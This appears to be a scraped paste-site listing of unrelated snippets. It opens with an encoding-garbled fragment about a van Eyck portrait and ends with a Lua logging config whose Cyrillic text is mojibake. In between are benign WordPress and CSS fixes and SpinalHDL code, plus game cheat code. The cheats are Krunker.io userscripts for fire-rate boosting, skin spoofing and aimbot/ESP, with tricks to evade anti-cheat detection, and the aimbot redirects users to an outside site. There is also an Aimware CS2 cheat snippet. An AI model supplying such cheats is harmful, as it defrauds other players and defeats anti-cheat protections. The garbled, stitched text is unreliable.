‚Äét‚Äéo‚Äé ‚Äéd‚Äée‚Äép‚Äéi‚Äéc‚Äét‚Äé ‚Äéa‚Äé ‚Äép‚Äéa‚Äéi‚Äén‚Äét‚Äée‚Äér‚Äé'‚Äés‚Äé ‚Äés‚Äép‚Äéo‚Äéu‚Äés‚Äée‚Äé.‚Äé ‚ÄéI‚Äét‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéc‚Äéo‚Äém‚Äép‚Äél‚Äée‚Äét‚Äée‚Äéd‚Äé ‚Äéw‚Äéh‚Äée‚Äén‚Äé ‚ÄéM‚Äéa‚Äér‚Äég‚Äéa‚Äér‚Äée‚Äét‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéa‚Äér‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚Äé3‚Äé4‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéh‚Äéu‚Äén‚Äég‚Äé ‚Äéu‚Äén‚Äét‚Äéi‚Äél‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äée‚Äéa‚Äér‚Äél‚Äéy‚Äé ‚Äé1‚Äé8‚Äét‚Äéh‚Äé ‚Äéc‚Äée‚Äén‚Äét‚Äéu‚Äér‚Äéy‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéh‚Äéa‚Äép‚Äée‚Äél‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äég‚Äéu‚Äéi‚Äél‚Äéd‚Äé ‚Äéo‚Äéf‚Äé ‚Äép‚Äéa‚Äéi‚Äén‚Äét‚Äée‚Äér‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚ÄéB‚Äér‚Äéu‚Äég‚Äée‚Äés‚Äé ‚Äé(‚Äéi‚Äén‚Äé ‚Äép‚Äér‚Äée‚Äés‚Äée‚Äén‚Äét‚Äé-‚Äéd‚Äéa‚Äéy‚Äé ‚ÄéB‚Äée‚Äél‚Äég‚Äéi‚Äéu‚Äém‚Äé)‚Äé.‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚Äéw‚Äéo‚Äér‚Äék‚Äé ‚Äéi‚Äés‚Äé ‚Äét‚Äéh‚Äéo‚Äéu‚Äég‚Äéh‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äée‚Äé ‚Äéa‚Äé ‚Äép‚Äée‚Äén‚Äéd‚Äéa‚Äén‚Äét‚Äé ‚Äéo‚Äér‚Äé ‚Äéa‚Äé ‚Äéd‚Äéi‚Äép‚Äét‚Äéy‚Äéc‚Äéh‚Äé ‚Äép‚Äéa‚Äén‚Äée‚Äél‚Äé,‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äév‚Äéa‚Äén‚Äé ‚ÄéE‚Äéy‚Äéc‚Äék‚Äé ‚Äéh‚Äéi‚Äém‚Äés‚Äée‚Äél‚Äéf‚Äé ‚Äéo‚Äéc‚Äéc‚Äéu‚Äép‚Äéy‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äéh‚Äéa‚Äél‚Äéf‚Äé ‚Äéi‚Äén‚Äé ‚Äée‚Äéi‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äéa‚Äé ‚Äén‚Äéo‚Äéw‚Äé ‚Äél‚Äéo‚Äés‚Äét‚Äé ‚Äés‚Äée‚Äél‚Äéf‚Äé-‚Äép‚Äéo‚Äér‚Äét‚Äér‚Äéa‚Äéi‚Äét‚Äé ‚Äék‚Äén‚Äéo‚Äéw‚Äén‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äér‚Äée‚Äéc‚Äéo‚Äér‚Äéd‚Äés‚Äé ‚Äéu‚Äén‚Äét‚Äéi‚Äél‚Äé ‚Äé1‚Äé7‚Äé6‚Äé9‚Äé,‚Äé ‚Äéo‚Äér‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚ÄéP‚Äéo‚Äér‚Äét‚Äér‚Äéa‚Äéi‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äéa‚Äé ‚ÄéM‚Äéa‚Äén‚Äé.‚Äé ‚ÄéT‚Äéh‚Äéi‚Äés‚Äé ‚Äép‚Äéo‚Äér‚Äét‚Äér‚Äéa‚Äéi‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéM‚Äéa‚Äér‚Äég‚Äéa‚Äér‚Äée‚Äét‚Äé ‚Äéi‚Äés‚Äé ‚Äén‚Äéo‚Äéw‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéo‚Äél‚Äél‚Äée‚Äéc‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéG‚Äér‚Äéo‚Äée‚Äén‚Äéi‚Äén‚Äég‚Äée‚Äém‚Äéu‚Äés‚Äée‚Äéu‚Äém‚Äé ‚Äéi‚Äén‚Äé ‚ÄéB‚Äér‚Äéu‚Äég‚Äée‚Äés‚Äé.‚Äé

P‚Äéa‚Äéi‚Äén‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéc‚Äér‚Äée‚Äéd‚Äéi‚Äét‚Äé:‚Äé ‚ÄéJ‚Äéa‚Äén‚Äé ‚Äév‚Äéa‚Äén‚Äé ‚ÄéE‚Äéy‚Äéc‚Äék‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

I‚Äé'‚Äél‚Äél‚Äé ‚Äéb‚Äée‚Äé ‚Äéb‚Äéa‚Äéc‚Äék‚Äé ‚Äét‚Äéo‚Äém‚Äéo‚Äér‚Äér‚Äéo‚Äéw‚Äé.‚Äé ‚ÄéS‚Äéo‚Äé ‚Äéa‚Äés‚Äé ‚ÄéI‚Äé ‚Äéa‚Äél‚Äéw‚Äéa‚Äéy‚Äés‚Äé ‚Äés‚Äéa‚Äéy‚Äé,‚Äé ‚Äéd‚Äéo‚Äén‚Äé'‚Äét‚Äé ‚Äéb‚Äée‚Äé ‚Äés‚Äéa‚Äéd‚Äé,‚Äé ‚Äém‚Äéa‚Äék‚Äée‚Äé ‚Äéo‚Äéo‚Äéh‚Äé ‚Äéo‚Äéo‚Äéh‚Äé ‚Äéa‚Äéh‚Äé ‚Äéa‚Äéh‚Äé ‚Äés‚Äéo‚Äéu‚Äén‚Äéd‚Äés‚Äé ‚Äéa‚Äét‚Äé ‚Äéb‚Äél‚Äéa‚Äéc‚Äék‚Äés‚Äé!‚Äé"
0VhWN7m4,KRUNKER.IO HACK INCREASE FIRE RATE,FlyFar,JavaScript,Sunday 7th of January 2024 09:52:32 PM CDT,"// ==UserScript==
// @name         krunker.io gun fire rate increase
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  gun fires pretty quick
// @author       joshua
// @match        https://krunker.io/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=krunker.io
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/469699/krunkerio%20gun%20fire%20rate%20increase.user.js
// @updateURL https://update.greasyfork.org/scripts/469699/krunkerio%20gun%20fire%20rate%20increase.meta.js
// ==/UserScript==
 
;(original => (Date.now = () => original() * 2123).toString = () => ""function now() {\n    [native code]\n}"")(Date.now);
// if you can send me code on how to toggle it"
ktuisHa3,KRUNKER.IO SKIN HACK V3.3.2 NEWEST,FlyFar,JavaScript,Sunday 7th of January 2024 09:50:41 PM CDT,"// ==UserScript==
// @name         Krunker.io skin hack
// @namespace    https://krunker.io/social.html?p=profile&q=MrLaugh
// @version      v3.3.2
// @description  Krunker.io skin hack v3.3.2
// @author       MrLaugh
// @match        *://krunker.io/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/416461/Krunkerio%20skin%20hack.user.js
// @updateURL https://update.greasyfork.org/scripts/416461/Krunkerio%20skin%20hack.meta.js
// ==/UserScript==

let skinConfig = {}

function s(c) {
    c.send = new Proxy(c.send, {
        apply(target, thisArg, msg) {
            if (msg[0] === ""ent"")
                skinConfig = {
                    main: msg[1][2][0],
                    secondary: msg[1][2][1],
                    hat: msg[1][3],
                    body: msg[1][4],
                    knife: msg[1][9],
                    dye: msg[1][14],
                    waist: msg[1][17],
                }

            return target.apply(thisArg, msg);
        }
    });
    c._dispatchEvent = new Proxy(c._dispatchEvent, {
        apply(target, thisArg, [type, msg]) {
            if (skinConfig && type === ""0"") {
                let playersInfo = msg[0];
                let perPlayerSize = 38;
                while (playersInfo.length % perPlayerSize !== 0)
                    perPlayerSize++;

                for(let i = 0; i < playersInfo.length; i += perPlayerSize)
                    if (playersInfo[i] === c.socketId) {
                        playersInfo[i + 12] = [skinConfig.main, skinConfig.secondary];
                        playersInfo[i + 13] = skinConfig.hat;
                        playersInfo[i + 14] = skinConfig.body;
                        playersInfo[i + 19] = skinConfig.knife;
                        playersInfo[i + 25] = skinConfig.dye;
                        playersInfo[i + 33] = skinConfig.waist;
                    }
            }
            return target.apply(thisArg, arguments[2]);
        }
    });
}

const events = Symbol(""kpal"")
Object.defineProperty(Object.prototype, ""events"", {enumerable:!1,get(){return this[events]},set(v){if(this.ahNum===0){s(this)}this[events]=v;}})
const skins = Symbol(""lol anticheat"")
Object.defineProperty(Object.prototype, ""skins"", {
    enumerable: false,
    get() {
        if (this.stats) {
            let skins = [];
            for(let i = 0; i < 5000; i++)
                skins.push({ind: i, cnt: i});

            return skins;
        }
        return this[skins];
    },
    set(v) { this[skins] = v; }
});"
cmp2ZEbu,Krunker.IO Aimbot & ESP,FlyFar,JavaScript,Sunday 7th of January 2024 09:47:27 PM CDT,"// ==UserScript==
// @name         Krunker.IO Aimbot & ESP
// @namespace    http://tampermonkey.net/
// @version      0.2.6
// @description  Locks aim to the nearest player in krunker.io and shows players behind walls. Also shows a line between you and them.
// @author       Zertalious (Zert)
// @match        *://krunker.io/*
// @match        *://browserfps.com/*
// @exclude      *://krunker.io/social*
// @exclude      *://krunker.io/editor*
// @icon         https://www.google.com/s2/favicons?domain=krunker.io
// @grant        none
// @run-at       document-start
// @require      https://unpkg.com/three@latest/build/three.min.js
// @antifeature  ads
// @downloadURL https://update.greasyfork.org/scripts/432453/KrunkerIO%20Aimbot%20%20ESP.user.js
// @updateURL https://update.greasyfork.org/scripts/432453/KrunkerIO%20Aimbot%20%20ESP.meta.js
// ==/UserScript==

const THREE = window.THREE;
Object.defineProperty( window, 'THREE', {
	get() {

		return undefined;

	}
} );

let scene;

const x = {
	window: window,
	document: document,
	querySelector: document.querySelector,
	consoleLog: console.log,
	ReflectApply: Reflect.apply,
	ArrayPrototype: Array.prototype,
	ArrayPush: Array.prototype.push,
	ObjectPrototype: Object.prototype,
	clearInterval: window.clearInterval,
	setTimeout: window.setTimeout,
	reToString: RegExp.prototype.toString,
	indexOf: String.prototype.indexOf
};

x.consoleLog( 'Waiting to inject...' );

const proxied = function ( object ) {

	// [native code]

	try {

		if ( typeof object === 'object' &&
			typeof object.parent === 'object' &&
			object.parent.type === 'Scene' &&
			object.parent.name === 'Main' ) {

			x.consoleLog( 'Found Scene!' )
			scene = object.parent;
			x.ArrayPrototype.push = x.ArrayPush;

		}

	} catch ( error ) {}

	return x.ArrayPush.apply( this, arguments );

}

/*

// This inject method gets detected now.

const _test = RegExp.prototype.test;

RegExp.prototype.test = function ( str ) {

	// [native code]

	if ( typeof str === 'string' ) {

		const re = x.reToString.call( this );

		if ( x.indexOf.call( re, 'native' ) > - 1 ) {

			x.consoleLog( 'test native:', this, str );

			x.setTimeout.call( x.window, function () {

				x.consoleLog( 'Injecting!' );
				x.ArrayPrototype.push = proxied;

			}, 0 );

		}

	}

	return _test.apply( this, arguments );

}*/

let espEnabled = true;
let aimbotEnabled = true;
let aimbotOnRightMouse = false;
let espLinesEnabled = true;

const tempVector = new THREE.Vector3();

const tempObject = new THREE.Object3D();
tempObject.rotation.order = 'YXZ';

const geometry = new THREE.EdgesGeometry( new THREE.BoxGeometry( 5, 15, 5 ).translate( 0, 7.5, 0 ) );

const material = new THREE.RawShaderMaterial( {
	vertexShader: `

	attribute vec3 position;

	uniform mat4 projectionMatrix;
	uniform mat4 modelViewMatrix;

	void main() {

		gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );
		gl_Position.z = 1.0;

	}

	`,
	fragmentShader: `

	void main() {

		gl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );

	}

	`
} );

const line = new THREE.LineSegments( new THREE.BufferGeometry(), material );

line.frustumCulled = false;

const linePositions = new THREE.BufferAttribute( new Float32Array( 100 * 2 * 3 ), 3 );
line.geometry.setAttribute( 'position', linePositions );

let injectTimer = null;

function animate() {

	window.requestAnimationFrame( animate );

	if ( ! scene && ! injectTimer ) {

		const el = x.querySelector.call( x.document, '#loadingBg' );

		if ( el && el.style.display === 'none' ) {

			x.consoleLog( 'Inject timer started!' );

			injectTimer = x.setTimeout.call( x.window, () => {

				x.consoleLog( 'Injected!' );
				x.ArrayPrototype.push = proxied;

			}, 2e3 );

		}

	}

	if ( typeof shouldShowAd === 'undefined' || shouldShowAd === true || scene === undefined || ! scene.children ) {

		return;

	}

	const players = [];

	let myPlayer;

	for ( let i = 0; i < scene.children.length; i ++ ) {

		const child = scene.children[ i ];

		if ( child.type === 'Object3D' ) {

			try {

				if ( child.children[ 0 ].children[ 0 ].type === 'PerspectiveCamera' ) {

					myPlayer = child;

				} else {

					players.push( child );

				}

			} catch ( err ) {}

		}

	}

	if ( ! myPlayer ) {

		x.consoleLog( 'Player not found, finding new scene.' );
		x.ArrayPrototype.push = proxied;
		return;

	}

	let counter = 0;

	let targetPlayer;
	let minDistance = Infinity;

	tempObject.matrix.copy( myPlayer.matrix ).invert()

	for ( let i = 0; i < players.length; i ++ ) {

		const player = players[ i ];

		if ( ! player.box ) {

			const box = new THREE.LineSegments( geometry, material );
			box.frustumCulled = false;

			player.add( box );

			player.box = box;

		}

		if ( player.position.x === myPlayer.position.x && player.position.z === myPlayer.position.z ) {

			player.box.visible = false;

			if ( line.parent !== player ) {

				player.add( line );

			}

			continue;

		}

		linePositions.setXYZ( counter ++, 0, 10, - 5 );

		tempVector.copy( player.position );

		tempVector.y += 9;

		tempVector.applyMatrix4( tempObject.matrix );

		linePositions.setXYZ(
			counter ++,
			tempVector.x,
			tempVector.y,
			tempVector.z
		);

		player.visible = espEnabled || player.visible;

		player.box.visible = espEnabled;

		const distance = player.position.distanceTo( myPlayer.position );

		if ( distance < minDistance ) {

			targetPlayer = player;

			minDistance = distance;

		}

	}

	linePositions.needsUpdate = true;
	line.geometry.setDrawRange( 0, counter );

	line.visible = espLinesEnabled;

	if ( aimbotEnabled === false || ( aimbotOnRightMouse && ! rightMouseDown ) || targetPlayer === undefined ) {

		return;

	}

	tempVector.setScalar( 0 );

	targetPlayer.children[ 0 ].children[ 0 ].localToWorld( tempVector );

	tempObject.position.copy( myPlayer.position );

	tempObject.lookAt( tempVector );

	myPlayer.children[ 0 ].rotation.x = - tempObject.rotation.x;
	myPlayer.rotation.y = tempObject.rotation.y + Math.PI;

}

const value = parseInt( new URLSearchParams( window.location.search ).get( 'showAd' ), 16 );

const shouldShowAd = isNaN( value ) || Date.now() - value < 0 || Date.now() - value > 10 * 60 * 1000;

const el = document.createElement( 'div' );

el.innerHTML = `<style>

.dialog {
	position: absolute;
	left: 50%;
	top: 50%;
	padding: 20px;
	background: rgba(0, 0, 0, 0.8);
	border: 6px solid rgba(0, 0, 0, 0.2);
	color: #fff;
	transform: translate(-50%, -50%);
	text-align: center;
	z-index: 999999;
}

.dialog * {
	color: #fff;
}

.close {
	position: absolute;
	right: 5px;
	top: 5px;
	width: 20px;
	height: 20px;
	opacity: 0.5;
	cursor: pointer;
}

.close:before, .close:after {
	content: ' ';
	position: absolute;
	left: 50%;
	top: 50%;
	width: 100%;
	height: 20%;
	transform: translate(-50%, -50%) rotate(-45deg);
	background: #fff;
}

.close:after {
	transform: translate(-50%, -50%) rotate(45deg);
}

.close:hover {
	opacity: 1;
}

.btn {
	cursor: pointer;
	padding: 0.5em;
	background: red;
	border: 3px solid rgba(0, 0, 0, 0.2);
}

.btn:active {
	transform: scale(0.8);
}

.msg {
	position: absolute;
	left: 10px;
	bottom: 10px;
	color: #fff;
	background: rgba(0, 0, 0, 0.6);
	font-weight: bolder;
	padding: 15px;
	animation: msg 0.5s forwards, msg 0.5s reverse forwards 3s;
	z-index: 999999;
	pointer-events: none;
}

@keyframes msg {
	from {
		transform: translate(-120%, 0);
	}

	to {
		transform: none;
	}
}

</style>
<div class=""msg"" style=""display: none;""></div>
<div class=""dialog"">${shouldShowAd ? `<big>Loading ad...</big>` : `<div class=""close"" onclick=""this.parentNode.style.display='none';""></div>
	<big>== Aimbot & ESP ==</big>
	<br>
	<br>
	[B] to toggle aimbot
	<br>
	[V] to toggle ESP
	<br>
	[N] to toggle ESP Lines
	<br>
	[L] to toggle aimbot on <br>right mouse hold
	<br>
	[H] to show/hide help
	<br>
	<br>
	By Zertalious
	<br>
	<br>
	<div style=""display: grid; grid-template-columns: 1fr 1fr; grid-gap: 5px;"">
		<div class=""btn"" onclick=""window.open('https://discord.gg/K24Zxy88VM', '_blank')"">Discord</div>
		<div class=""btn"" onclick=""window.open('https://www.instagram.com/zertalious/', '_blank')"">Instagram</div>
		<div class=""btn"" onclick=""window.open('https://twitter.com/Zertalious', '_blank')"">Twitter</div>
		<div class=""btn"" onclick=""window.open('https://greasyfork.org/en/users/662330-zertalious', '_blank')"">More scripts</div>
	</div>
	` }
</div>`;

const msgEl = el.querySelector( '.msg' );
const dialogEl = el.querySelector( '.dialog' );

window.addEventListener( 'DOMContentLoaded', function () {

	while ( el.children.length > 0 ) {

		document.body.appendChild( el.children[ 0 ] );

	}

} );

if ( shouldShowAd ) {

	const url = new URL( window.location.href );

	url.searchParams.set( 'showAd', Date.now().toString( 16 ) );
	url.searchParams.set( 'scriptVersion', GM.info.script.version );

	window.location.href = 'https://zertalious.xyz?ref=' + new TextEncoder().encode( url.href ).toString();

}

let rightMouseDown = false;

function handleMouse( event ) {

	if ( event.button === 2 ) {

		rightMouseDown = event.type === 'pointerdown' ? true : false;

	}

}

window.addEventListener( 'pointerdown', handleMouse );
window.addEventListener( 'pointerup', handleMouse );

window.addEventListener( 'keyup', function ( event ) {

	switch ( event.code ) {

		case 'KeyV' :

			espEnabled = ! espEnabled;

			showMsg( 'ESP', espEnabled );

			break;

		case 'KeyB' :

			aimbotEnabled = ! aimbotEnabled;

			showMsg( 'Aimbot', aimbotEnabled );

			break;

		case 'KeyH' :

			dialogEl.style.display = dialogEl.style.display === '' ? 'none' : '';

			break;

		case 'KeyL' :

			aimbotOnRightMouse = ! aimbotOnRightMouse;

			showMsg( 'Aimbot On Right Mouse Hold', aimbotOnRightMouse );

			break;

		case 'KeyN' :

			espLinesEnabled = ! espLinesEnabled;

			showMsg( 'ESP Lines', espLinesEnabled );

			break;

	}

} );

function showMsg( name, bool ) {

	msgEl.innerText = name + ': ' + ( bool ? 'ON' : 'OFF' );

	msgEl.style.display = 'none';

	void msgEl.offsetWidth;

	msgEl.style.display = '';

}

animate();"
Z93QL7jJ,Fix sorting in admin panel for Intuitive Custom Posts Order plugin,artemsemkin,PHP,Sunday 7th of January 2024 09:01:32 PM CDT,"<?php

// Temporary fix for Intuitive Custom Posts Order plugin
add_action( 'admin_init', 'arts_hicpo_fix_capabilities' );
function arts_hicpo_fix_capabilities() {
  $administrator = get_role( 'administrator' );
  if ( $administrator ) {
    $administrator->add_cap( 'hicpo_load_script_css' );
  }

  $editor = get_role( 'editor' );
  if ( $editor ) {
    $editor->add_cap( 'hicpo_load_script_css' );
  }
}"
bPeQbvbG,Untitled,vrangan,Scala,Sunday 7th of January 2024 08:46:25 PM CDT,"package vexriscv.demo


import spinal.core._
import spinal.lib._
import spinal.lib.bus.amba3.apb._
import spinal.lib.bus.amba4.axi._
import spinal.lib.io.{TriStateArray, TriState}

import spinal.lib.misc.HexTools

import scala.collection.mutable.ArrayBuffer
import scala.collection.Seq

case class USB23_IO() extends Bundle with IMasterSlave {
  val VBUS         = Analog(Bits(1 bits))
  val DM            = Analog(Bits(1 bits))
  val DP            = Analog(Bits(1 bits))
  val REFINCLKEXTP = Analog(Bits(1 bits))
  val REFINCLKEXTM = Analog(Bits(1 bits))
  val RESEXTUSB2     = Analog(Bits(1 bits))
  val RXP         = Analog(Bits(1 bits))
  val RXM         = Analog(Bits(1 bits))
  val TXP         = Analog(Bits(1 bits))
  val TXM         = Analog(Bits(1 bits))
  val clkIn = Bool
  val dOut = Bool

  override def asMaster() : Unit = {
    out(dOut)
    in(clkIn)
    inout(VBUS, DM, DP, REFINCLKEXTM, REFINCLKEXTP, RESEXTUSB2, RXM, RXP,
          TXM, TXP)
  }
}

case class USB23() extends BlackBox {
  val io = new Bundle {
    val clkIn = in Bool()
    val io    = master(USB23_IO())
  }
  noIoPrefix()
}

class TinyClunx(
                onChipRamSize : BigInt
                ) extends Component{

    val axiMConfig = Axi4Config(
    addressWidth = 17,
    dataWidth    = 64,
    idWidth      = 3,
    useRegion    = false,
    useLock      = false,
    useQos      = false,
    useResp = false,
    useProt=false,
    useStrb=false
        )

    val axiSConfig = Axi4Config(
    addressWidth = 17,
    dataWidth    = 64,
    idWidth      = 4,
    useRegion    = false,
    useLock      = false,
    useQos      = false,
    useResp = false,
    useProt=false,
    useStrb=false
    )

  val io = new Bundle{
    //Clocks / reset
    val axiReset = in Bool()
    val axiClk   = in Bool()
    val axiM1    = slave(Axi4(axiMConfig))
    //val usbIO    = master(USB23_IO())
    val axiM2    = slave(Axi4Shared(axiMConfig))
    val axiS1    = master(Axi4Shared(axiSConfig))
  }
  noIoPrefix()

  val axiClockDomain = ClockDomain(
    clock = io.axiClk,
    reset = io.axiReset
    )

  val axi1 = new ClockingArea(axiClockDomain) {
    val ram1 = Axi4SharedOnChipRam(
      dataWidth = 64,
      byteCount = onChipRamSize,
      idWidth = axiMConfig.idWidth+1
    )

/*
    val ram2 = Axi4SharedOnChipRam(
      dataWidth = 64,
      byteCount = onChipRamSize,
      idWidth = axiConfig.idWidth+1
    )
*/
    //val axiM2 = Axi4(axiConfig)


    //val usbCore = new USB23

    val axiCrossbar = Axi4CrossbarFactory()

    axiCrossbar.addSlaves(
      ram1.io.axi       -> (0x00000000L,   onChipRamSize),
      io.axiS1          -> (0x00010000L,   onChipRamSize)
    )

    axiCrossbar.addConnections(
      io.axiM2        -> List(ram1.io.axi, io.axiS1),
      io.axiM1        -> List(ram1.io.axi, io.axiS1)
    )

    axiCrossbar.build()
  }

    //usbCore.io.clkIn := io.axiClk
    //io.usbIO := usbCore.io.io
}

object TinyClunx{
  def main(args: Array[String]) {
    val config = SpinalConfig()
    config.generateVerilog({
      val toplevel = new TinyClunx(onChipRamSize = 8 kB)
      toplevel
    })
  }
}

// With memory init
object TinyCClunxWithMemoryInit{
  def main(args: Array[String]) {
    val config = SpinalConfig()
    config.generateVerilog({
      val toplevel = new TinyClunx(onChipRamSize = 8 kB)
      HexTools.initRam(toplevel.axi1.ram1.ram, ""src/main/ressource/hex/muraxDemo.hex"", 0x80000000l)
      toplevel
    })
  }
}

"
Xj13BKqn,Aimware.net CS2 v5.1 remove viewmodel in scope,Dr_Coomer,Lua,Sunday 7th of January 2024 07:58:37 PM CDT,"callbacks.Register(""CreateMove"", function()
		      local localp = entities.GetLocalPawn()
		      if localp == nil then return end
		     
		      if localp:GetFieldBool(""m_bIsScoped"") == true then
			 client.SetConVar(""r_drawviewmodel"", false, true)
		      elseif localp:GetFieldBool(""m_bIsScoped"") == false then
			 client.SetConVar(""r_drawviewmodel"", true, true)
		      end
end)

callbacks.Register(""Unload"", function()
			 client.SetConVar(""r_drawviewmodel"", true, true)
end)
"
z11r4h21,Kinsey theme: fix icons color,artemsemkin,CSS,Sunday 7th of January 2024 07:55:58 PM CDT,".soc1al .soc1al__item svg {
  fill: currentColor;
}"
ufq5QhVH,Kinsey theme: fetch posts published before a date,artemsemkin,PHP,Sunday 7th of January 2024 07:42:01 PM CDT,"<?php

add_filter( 'arts/elementor/kinsey_widget_portfolio_fullscreen_slider_backgrounds_1/query_args', 'custom_kinsey_filter_2' );
function custom_kinsey_filter_2( $args ) {
  $args['date_query'] = array(
    array(
      'before'    => 'July 20, 2021',
      'inclusive' => true,
    ),
  );

  return $args;
}"
4iQDMkKq,Kinsey theme: disable sidebar,artemsemkin,PHP,Sunday 7th of January 2024 07:14:55 PM CDT,"<?php

// Temporarily disable sidebar
add_filter( 'is_active_sidebar', 'custom_filter_is_active_sidebar', 10, 2);
function custom_filter_is_active_sidebar( $is_active_sidebar, $index ) {
  if ( $index === 'blog-sidebar' ) {
    return false;
  }

  return $is_active_sidebar;
}
"
pstQgqkw,Logs_Config,Friks12829,Lua,Sunday 7th of January 2024 07:05:37 PM CDT,"local category = ""–£–±–∏–π—Å—Ç–≤–∞""
local name = ""DC_LOG_KILLS""
local format = ""%s —É–±–∏–ª –∏–≥—Ä–æ–∫–∞ %s —Å –ø–æ–º–æ—â—å—é %s""
local hookName = ""PlayerDeath""
DC_CORE:AddHook(category,  hookName, name, function(ply, inf, attacker)
	DC_CORE:AddLog(category, hookName, format, 
		{ -- –º–∞—Å—Å–∏–≤ –∏–Ω—Ñ—ã
			[1] = -- –∂–µ—Ä—Ç–≤–∞
			{ 	
				ply.Nick and ply:Nick() or ""???"",
				ply.SteamID and ply:SteamID() or ""???""
			},
			[2] = { -- —É–±–∏–π—Ü–∞
				attacker.Nick and attacker:Nick() or ""???"",
				attacker.SteamID and attacker:SteamID() or ""???""					
			}
		},
		attacker.Nick and attacker:Nick() or ""world"", -- —Ñ–æ—Ä–º–∞—Ç —Å—Ç—Ä–æ–∫–∏ –≤ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –æ—á–µ—Ä–µ–¥–∏
		ply.Nick and ply:Nick() or ""???"", -- —Ñ–æ—Ä–º–∞—Ç —Å—Ç—Ä–æ–∫–∏ –≤ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –æ—á–µ—Ä–µ–¥–∏
		inf:GetClass() -- —Ñ–æ—Ä–º–∞—Ç —Å—Ç—Ä–æ–∫–∏ –≤ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –æ—á–µ—Ä–µ–¥–∏
	)
end)

local category = ""–î–µ–Ω—å–≥–∏""
local name = ""DC_LOG_MONEY""
local format = ""–ò–≥—Ä–æ–∫ %s –≤—ã–±—Ä–æ—Å–∏–ª –¥–µ–Ω—å–≥–∏ –≤ —Ä–∞–∑–º–µ—Ä–µ %s""
local hookName = ""playerDroppedMoney""
DC_CORE:AddHook(category,  hookName, name, function(ply, amount, entity)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		},
		ply.Nick and ply:Nick() or ""???"", 
		DarkRP.formatMoney(amount)
	)
end)
local format = ""–ò–≥—Ä–æ–∫ %s –≤—ã–±—Ä–æ—Å–∏–ª –¥–µ–Ω—å–≥–∏ –≤ —Ä–∞–∑–º–µ—Ä–µ %s""
local hookName = ""playerPickedUpMoney""
DC_CORE:AddHook(category,  hookName, name, function(ply, amount)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		},
		ply.Nick and ply:Nick() or ""???"", 
		DarkRP.formatMoney(amount)
	)
end)

local format = ""–ò–≥—Ä–æ–∫—É %s –≤—ã–¥–∞–ª–∏ –¥–µ–Ω—å–≥–∏ –Ω–∞ —Å—É–º–º—É %s. –î–µ–Ω–µ–≥ –¥–æ –≤—ã–¥–∞—á–∏ –±—ã–ª–æ %s""
local hookName = ""playerWalletChanged""
DC_CORE:AddHook(category,  hookName, name, function(ply, amount, wallet)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		},
		ply.Nick and ply:Nick() or ""???"", 
		DarkRP.formatMoney(amount),
		DarkRP.formatMoney(wallet)
	)
end)

local category = ""–í—ã—Ö–æ–¥—ã/–∑–∞—Ö–æ–¥—ã""
local name = ""DC_LOG_JOINACT""
local format = ""–ò–≥—Ä–æ–∫ %s –ø—Ä–∏—Å–æ–µ–¥–∏–Ω–∏–ª—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä.""
local hookName = ""PlayerInitialSpawn""
DC_CORE:AddHook(category,  hookName, name, function(ply)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		},
		ply.Nick and ply:Nick() or ""???""
	)
end)

local format = ""–ò–≥—Ä–æ–∫ %s –ø–æ–∫–∏–Ω—É–ª —Å–µ—Ä–≤–µ—Ä.""
local hookName = ""PlayerDisconnected""	
DC_CORE:AddHook(category,  hookName, name, function(ply)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		},
		ply.Nick and ply:Nick() or ""???""
	)
end)

local category = ""–û—Ç–º—ã—á–∫–∞""
local name = ""DC_LOG_LOCKPICK""
local format = ""–ò–≥—Ä–æ–∫ %s –Ω–∞—á–∞–ª –≤–∑–ª–∞–º—ã–≤–∞—Ç—å %s.""
local hookName = ""lockpickStarted""	
